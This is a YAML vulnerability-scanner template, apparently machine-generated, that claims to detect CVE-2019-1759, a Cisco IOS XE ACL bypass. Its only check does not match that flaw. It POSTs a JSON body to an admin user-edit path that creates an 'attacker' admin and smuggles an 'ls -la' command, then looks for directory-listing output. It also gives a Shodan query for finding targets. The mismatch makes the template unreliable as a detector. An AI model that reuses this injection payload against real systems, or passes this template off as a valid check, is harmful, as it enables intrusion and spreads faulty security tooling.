id: CVE-2019-1759

info:
  name: Cisco IOS XE Software ACL Bypass Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: A vulnerability in the ACL functionality of the Gigabit Ethernet Management interface of Cisco IOS XE Software could allow an unauthenticated, remote attacker to reach the configured IP addresses on the Gigabit Ethernet Management interface.
  impact: |
    Successful exploitation could result in unauthorized access to sensitive information or network resources.
  remediation: |
    Apply the necessary security patches provided by Cisco to mitigate the vulnerability (CVE-2019-1759).
  reference:
    - https://github.com/r3m0t3nu11/CVE-2019-1759-csrf-js-rce
    - https://github.com/0xT11/CVE-POC
    - https://github.com/developer3000S/PoC-in-GitHub
    - https://github.com/hectorgie/PoC-in-GitHub
    - https://github.com/nomi-sec/PoC-in-GitHub
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
    cvss-score: 5.3
    cve-id: CVE-2019-1759
    cwe-id: CWE-287,CWE-284
    epss-score: 0.00097
    epss-percentile: 0.42025
    cpe: cpe:2.3:o:cisco:ios_xe:3.2.0ja:*:*:*:*:*:*:*
  metadata:
    vendor: cisco
    product: ios_xe
    shodan-query: http.html_hash:1076109428

http:
  - method: POST
    path:
      - "{{BaseURL}}/admin/users/edit/1"

    headers:
      Content-Type: application/json

    body: |
      {"username": "attacker", "password": "password", "roles": "admin", "command": "ls -la"}
    matchers:
      - type: word
        words:
          - "total"
          - "drwxr-xr-x"
        part: body
